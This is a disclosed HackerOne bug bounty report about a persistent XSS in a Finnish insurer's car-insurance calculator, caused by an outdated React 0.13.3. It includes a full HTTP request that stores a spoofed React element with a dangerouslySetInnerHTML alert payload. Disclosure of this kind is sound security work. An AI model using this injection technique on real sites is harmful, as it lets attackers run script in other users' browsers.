---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '139004'
original_report_id: '139004'
title: Persistent XSS at verkkopalvelu.tapiola.fi using spoofed React element and
  React v.0.13.3
weakness: Cross-site Scripting (XSS) - Generic
team_handle: localtapiola
created_at: '2016-05-15T21:21:03.025Z'
disclosed_at: '2016-06-27T22:32:08.453Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 27
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# Persistent XSS at verkkopalvelu.tapiola.fi using spoofed React element and React v.0.13.3

## Metadata

- HackerOne Report ID: 139004
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: localtapiola
- Disclosed At: 2016-06-27T22:32:08.453Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Hi,

## Background
I noticed that the app at:
https://verkkopalvelu.tapiola.fi/e2/autovakuutus/vakuutuslaskuri/

was running an old version of React. In this version (0.13.3) there's an issue, initially discovered by @danlec actually on HackerOne: http://danlec.com/blog/xss-via-a-spoofed-react-element 

The patch by React was made in version 0.14: https://facebook.github.io/react/blog/2015/10/07/react-v0.14.html

## PoC

So I noticed that the application had a possible way to save a registration in the middle of the process, being able to get an URL to continue with the registration. This save would make a call that looked like this:

```
POST /e2/autovakuutus/vakuutuslaskuri/api/vehicle/link/continue/ HTTP/1.1
Host: verkkopalvelu.lahitapiola.fi
Content-Type: application/json

{
    "79rtwta5z4hjkn3npvu5ak0521": {
        "dateOfIntroduction": {
            "isValid": true, 
            "error": "", 
...
}
```

This would then respond with a unique identifier:
```
{"id":"ID"}
```
This data would then be used, if you used a link formatted like this:
https://verkkopalvelu.tapiola.fi/e2/autovakuutus/vakuutuslaskuri/#/continue/ID

The problem, apart from running an old version of React, is that the JSON being saved is not controlled in any way what content it has, which means you're able to extend the JSON further. Now, the content in the elements are being placed inside the DOM of the page, especially the `"error"`-element.

So, to use @danlec's way to inject a spoofed React element, we use the following request:

```
POST /e2/autovakuutus/vakuutuslaskuri/api/vehicle/link/continue/ HTTP/1.1
Host: verkkopalvelu.lahitapiola.fi
Connection: keep-alive
Content-Length: 875
Accept: application/json, text/javascript
Content-Type: application/json
Accept-Encoding: gzip, deflate
Cookie: caruid=fd20a9cb-5d40-4127-8858-ca2961bdb789;

{"79rtwta5z4hjkn3npvu5ak0521":{"postCode":{"isValid":true,"error":{"_store":{},"type":"body","props":{"dangerouslySetInnerHTML":{"__html":"<img src=x onerror=alert(document.domain)>"}},"_isReactElement":true},"value":"jjj"},"dateOfIntroduction":{"isValid":true,"error":"","value":"JAJAJA"},"cylinderCapacity":{"isValid":true,"error":"","value":"yyy"},"manufacturerCode":{"isValid":true,"error":"","value":"zzz"},"netPower":{"isValid":true,"error":"","value":"bbb"},"birthDate":{"isValid":true,"error":"","value":"11.11.2011xxx"},"grossWeight":{"isValid":true,"error":"","value":"ccc"},"carType":{"isValid":true,"error":"","value":"x"},"isRentedOrLeased":{"isValid":true,"error":"","value":"eee"},"registrationPart2":{"isValid":true,"error":"","value":"fff"},"modelCode":{"isValid":true,"error":"","value":"ggg"},"registrationPart1":{"isValid":true,"error":"","value":"hhh"}}}
```

You can see my inserted payload here:
https://verkkopalvelu.lahitapiola.fi/e2/autovakuutus/vakuutuslaskuri/api/vehicle/link/continue/c455cb02-6a14-4767-9c63-eb22d9c16be5

Which would then result in the following URL using the React app:
https://verkkopalvelu.tapiola.fi/e2/autovakuutus/vakuutuslaskuri/#/continue/c455cb02-6a14-4767-9c63-eb22d9c16be5

Which has the following output in the DOM:

{F94020}

That results in the javascript running when accessing the page:

{F94022}

## Solution

You should update the React version to >0.14 (and most likely also change so the structure of the JSON that is getting saved is controlled by you.

Regards,
Frans

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
